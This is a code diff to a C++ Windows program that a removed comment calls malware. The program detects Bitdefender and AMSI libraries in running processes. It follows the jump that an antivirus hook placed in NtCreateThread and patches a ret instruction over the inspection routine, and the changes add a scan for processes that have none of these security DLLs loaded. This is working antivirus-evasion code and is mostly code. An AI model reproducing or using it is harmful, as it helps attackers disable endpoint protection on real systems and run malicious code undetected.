@@ -8,24 +8,78 @@
 #include <conio.h>
 #include <sstream>
 #include "Sysmon.h"
+#include "WhiteListedProcesses.h"
 
 #pragma comment(lib, "Psapi.lib")
 #pragma comment(lib, "Wtsapi32.lib")
 
-// C++ Malware that unload from all the current and future processes some specifyc security libraries 
-// 1. Get all the DLL's loaded injected in the current process
-// 2. Get the used address in AV hooks to jmp to the evaluation function via the assembly instruction jmp in the first memory address of NtCreateThread
-// 3. Add a ret instruction to the evaluation function
-
 using namespace std;
 
 unordered_map<string, string> Products = {
+	{"Amsi", "amsi.dll"},
 	{"Bitdefender", "atcuf64.dll"},
 	{"Bitdenfender", "atcuf32.dll"},
 	{"Bitdefender", "bdhkm64.dll" },
 };
 
+struct ProcessInfo {
+	string processName;
+	DWORD pid;
+};
+
 bool bitdefenderFound = false;
+
+deque<ProcessInfo> getWhiteListedProcesses() {
+	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	deque<ProcessInfo> result; 
+
+	if (hSnap == INVALID_HANDLE_VALUE) {
+		cout << "Failed to create snapshot" << endl;
+		return result; 
+	}
+
+	PROCESSENTRY32W pe32;
+	pe32.dwSize = sizeof(PROCESSENTRY32W);
+
+	if (Process32FirstW(hSnap, &pe32) == FALSE) {
+		cout << "Failed to get first process" << endl;
+		CloseHandle(hSnap);
+		return result; 
+	}
+
+	do {
+		HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
+		if (hProcess == NULL) {
+			continue;
+		}
+
+		bool containsWhitelistedDLL = false;
+		deque<string> modules = ListModulesByProcess(hProcess);
+		if (modules.size() == 0) {
+			continue;
+		}
+		for (auto& module : modules) {
+			for (auto& product : Products) {
+				if (module.find(product.second) != string::npos) {
+					containsWhitelistedDLL = true;
+					cout << "DLL found: " << product.first << " in process: " << getProcessNameByPID(pe32.th32ProcessID) << endl;
+					break; 
+				}
+			}
+			if (containsWhitelistedDLL) break;
+		}
+
+		if (!containsWhitelistedDLL) {
+			ProcessInfo info = { getProcessNameByPID(pe32.th32ProcessID), pe32.th32ProcessID };
+			result.push_back(info);
+		}
+
+		CloseHandle(hProcess);
+	} while (Process32NextW(hSnap, &pe32));
+
+	CloseHandle(hSnap);
+	return result; 
+}
 
 deque<string> ListModules() {
 	deque<string> modules = {};
@@ -82,6 +136,19 @@ string DisassembleFunction(BYTE* buffer, SIZE_T size) {
 
 int main(int argc, char* argv[])
 {
+	deque<ProcessInfo> result = getWhiteListedProcesses();
+
+	if (result.size() == 0) {
+		cout << "No whitelisted processes found" << endl;
+	}
+	else {
+		cout << "Whitelisted processes found" << endl;
+		for (auto& process : result) {
+			cout << process.processName << " " << process.pid << endl;
+		}
+	}
+	//return 0;
+
 	// 1. Get all the DLL's loaded injected in the current process
 	deque<string> modules = ListModules();
 	int sysmon = -1;
@@ -106,8 +173,10 @@ int main(int argc, char* argv[])
 		}
 	}
 
+
 	if (bitdefenderFound) {
-		cout << "Bitdefender found" << endl;
+		cout << "Bitdefender found\nBefore evasion" << endl;
+		getchar();
 		HMODULE ntDLLHandle = GetModuleHandle(L"ntdll.dll");
 		if (ntDLLHandle == NULL) {
 			cout << "Error getting ntdll.dll handle" << endl;
@@ -155,7 +224,9 @@ int main(int argc, char* argv[])
 			// Add a ret instruction to the jmpTargetAddress function
 			BYTE retInstruction = 0xC3;
 			if (WriteProcessMemory(GetCurrentProcess(), reinterpret_cast<LPVOID>(jmpTargetAddress), &retInstruction, sizeof(retInstruction), NULL)) {
-				cout << "Ret instruction added to the jmp target address" << endl;
+				cout << "Ret instruction added to the jmp target address\nAfter evasion" << endl;
+				getchar();
+				return 0;
 			}
 			else {
 				cout << "Error adding ret instruction to the jmp target address" << endl;
